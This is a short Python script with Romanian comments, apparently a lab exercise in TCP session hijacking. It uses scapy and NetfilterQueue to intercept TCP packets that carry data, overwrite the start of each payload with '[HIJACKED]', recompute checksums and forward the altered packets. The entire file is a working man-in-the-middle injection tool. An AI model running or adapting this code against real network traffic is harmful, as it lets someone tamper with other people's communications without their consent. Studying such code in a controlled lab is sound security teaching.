from scapy.all import *
from netfilterqueue import NetfilterQueue #interfata din python pentru cozi de pachete din iptables

INJECTED_MESSAGE =b'[HIJACKED]'

def process_packet(packet):
    scapy_packet = IP(packet.get_payload()) #transform pachetul primit in unu de tip scapy
    #get_playload retureneaza in raw bytes pachetul 
    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw): #iau doar pachetele de tip TCP cu un continut acolo ceva
        payload = scapy_packet[Raw].load
        if scapy_packet[TCP].flags & 0x18 == 0x18:  # PSH(0x0.08) + ACK(0x0.10) doar bitii 3 si 4
        # adica daca are flagul PUSH gen mai important si flagul ACK adica confirma primirea
            print(f"[+] Pachet interceptat: {payload}")
            if isinstance(payload, str):
               payload = payload.encode() #sa fie sigur in bytes
            new_payload = INJECTED_MESSAGE + payload[len(INJECTED_MESSAGE):] #pun hijacked doar la inceputul mesajul 
            seq_diff = len(new_payload) - len(payload)
            scapy_packet[Raw].load = new_payload #daca modific mesajul, trebuie sa sterg aceste capuri ca le calculeaza automat
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum

            packet.set_payload(bytes(scapy_packet))
            print("[+] Mesaj injectat și retransmis.")

    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet) #leg coada cu id 0 la functia process
try:
    print("[*] Hijacking activ. Aștept pachete...")
    nfqueue.run()
except KeyboardInterrupt:
    print("[-] Oprire hijack.")
